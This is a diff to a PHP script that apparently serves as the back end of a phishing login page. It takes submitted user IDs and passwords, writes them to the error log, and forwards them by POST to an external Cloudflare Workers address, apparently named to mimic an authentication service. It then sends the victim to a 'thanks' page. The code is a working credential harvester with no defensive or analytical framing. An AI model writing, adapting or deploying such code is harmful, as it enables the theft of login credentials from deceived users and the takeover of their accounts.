@@ -1,41 +1,28 @@
 <?php
-// Get JSON input from the request
+// Capture POST data
 $data = json_decode(file_get_contents("php://input"), true);
 
-// Extract userID and password from the form
-$userID = isset($data['userID']) ? $data['userID'] : '';
-$password = isset($data['password']) ? $data['password'] : '';
+// Log data for debugging
+error_log(json_encode($data));
 
-// Check if both fields are filled
-if (!empty($userID) && !empty($password)) {
-    // Prepare data to send to your Cloudflare Worker
-    $postData = json_encode([
-        'userID' => $userID,
-        'password' => $password
-    ]);
+// Forward to Cloudflare Worker
+$worker_url = "https://aut0-curr-9dc7.henrycrane65.workers.dev/";
 
-    // Your Cloudflare Worker URL
-    $workerUrl = "https://aut0-curr-9dc7.henrycrane65.workers.dev/";
+$options = [
+    "http" => [
+        "header" => "Content-Type: application/json\r\n",
+        "method" => "POST",
+        "content" => json_encode($data),
+    ],
+];
 
-    // Initialize cURL
-    $ch = curl_init($workerUrl);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        "Content-Type: application/json"
-    ]);
+$context = stream_context_create($options);
+$response = file_get_contents($worker_url, false, $context);
 
-    // Execute request and get response
-    $response = curl_exec($ch);
-    curl_close($ch);
+// Log response from Worker
+error_log("Worker Response: " . json_encode($http_response_header));
 
-    // Redirect after successful submission
-    header("Location: ./thanks.html");
-    exit();
-} else {
-    // If missing fields, redirect back to login
-    header("Location: ./index.html");
-    exit();
-}
+// Redirect to thanks.html after sending
+header("Location: ./thanks.html");
+exit;
 ?>
